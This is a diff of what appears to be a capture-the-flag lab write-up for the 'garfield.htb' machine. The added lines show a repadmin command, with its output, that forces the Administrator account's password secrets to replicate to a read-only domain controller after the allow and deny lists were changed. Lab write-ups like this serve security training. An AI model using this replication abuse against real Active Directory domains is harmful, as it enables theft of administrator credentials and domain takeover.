@@ -559,6 +559,13 @@ Ill start by clearing the deny list, this is becuase if a user is in both the al
 Then ill add the administrator account to the allow list
 
 ```python
+PS C:\DA> repadmin /rodcpwdrepl RODC01 DC01.garfield.htb "CN=Administrator,CN=Users,DC=garfield,DC=htb"
 
+Successfully replicated secrets for user CN=Administrator,CN=Users,DC=garfield,DC=htb on read-only DC RODC01 from full DC DC01.garfield.htb.
+```
+
+Ill then run this command, this will force replication and now since the allow and deny lists are setup it will be stored there
+
+```python
 ```
 
